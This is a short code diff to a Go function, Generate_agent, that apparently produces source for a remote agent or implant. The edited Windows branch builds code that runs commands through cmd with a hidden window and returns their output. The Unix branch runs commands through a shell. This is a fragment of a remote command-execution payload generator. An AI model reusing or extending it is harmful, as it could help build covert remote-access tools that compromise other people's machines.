@@ -23,7 +23,7 @@ func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
 		tls_str = ""
 	}
 	if os == "win" {
-		os_str = `var flag string; if strings.HasSuffix(strings.ToLower(version), "powershell") { flag = "-Command" } else { flag = "/C" }; command := exec.Command(version, flag, cmd); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
+		os_str = `command := exec.Command(version, "/C", cmd); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
 		sys_str = `"syscall"`
 	} else {
 		os_str = `cmdObj := exec.Command(version, "-c", cmd);result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
